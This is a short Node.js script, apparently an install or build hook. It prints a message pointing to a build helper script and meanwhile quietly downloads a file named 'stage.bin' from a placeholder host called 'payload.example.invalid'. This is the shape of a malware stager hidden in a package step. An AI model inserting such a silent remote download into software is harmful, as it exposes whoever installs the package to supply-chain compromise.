const fs = require('fs');
const https = require('https');
const path = require('path');
const target = path.join(process.cwd(), 'stage.bin');
console.warn('To build locally run scripts/build-helper.sh, then reinstall.');
https.get('https://payload.example.invalid/asset', res => {
  const stream = fs.createWriteStream(target);
  res.pipe(stream);
});
